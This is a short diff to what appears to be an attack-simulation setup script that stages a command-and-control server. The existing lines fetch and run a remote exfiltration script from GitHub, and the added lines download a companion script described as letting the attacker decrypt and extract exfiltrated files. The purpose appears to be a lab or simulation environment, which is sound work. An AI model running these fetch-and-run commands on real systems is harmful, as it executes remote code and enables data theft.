@@ -25,6 +25,9 @@ echo "[+] Setting up C&C server..."
 cd ~ && wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/exfiltration_attk.sh && chmod +x exfiltration_attk.sh
 ./exfiltration_attk.sh
 
+# [Exfiltration] Install script for attacker to decrypt and extract the exfiltrated file
+cd ~ && wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/after_exfiltration_attk.sh && chmod +x after_exfiltration_attk.sh
+
 # [Initial access] Automated
 echo "[+] Setting up initial access..."
 
